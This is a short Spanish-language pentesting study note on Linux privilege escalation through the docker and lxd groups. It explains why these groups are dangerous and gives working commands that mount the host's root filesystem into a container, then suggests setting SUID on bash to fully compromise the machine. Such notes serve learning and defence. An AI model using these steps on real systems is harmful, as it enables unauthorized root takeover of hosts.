#privesc 

# ¿Qué es?

En el contexto de Linux, los **grupos** se utilizan para **organizar** a los usuarios y **asignar** **permisos** para acceder a los recursos del sistema. Los usuarios pueden pertenecer a uno o varios grupos, y los grupos pueden tener diferentes niveles de permisos para acceder a los recursos del sistema.

Existen grupos especiales en Linux, como ‘**lxd**‘ o ‘**docker**‘, que se utilizan para permitir a los usuarios ejecutar contenedores de manera segura y eficiente. Sin embargo, si un usuario malintencionado tiene acceso a uno de estos grupos, podría aprovecharlo para obtener privilegios elevados en el sistema.

Por ejemplo, si un usuario tiene acceso al grupo ‘**docker**‘, podría utilizar la herramienta Docker para desplegar nuevos contenedores en el sistema. Durante el proceso de despliegue, el usuario podría aprovecharse de las **monturas** (**mounts**) para hacer que ciertos recursos inaccesibles en la máquina host estén disponibles en el contenedor. Al ganar acceso al contenedor como usuario ‘**root**‘, el usuario malintencionado podría inferir o manipular el contenido de estos recursos desde el contenedor.

# Grupos

## docker

Jugando con monturas de [[Docker]], podemos tratar de montar en un contenedor la raíz del sistema para tener acceso a todos sus archivos:

```bash
docker run -dit -v /:/mnt/root --name privesc <image>
```
```bash
docker exec -it privesc bash
```

Tras esto podemos dar privilegios *suid* a la [[bash]] para comprometer totalmente la máquina.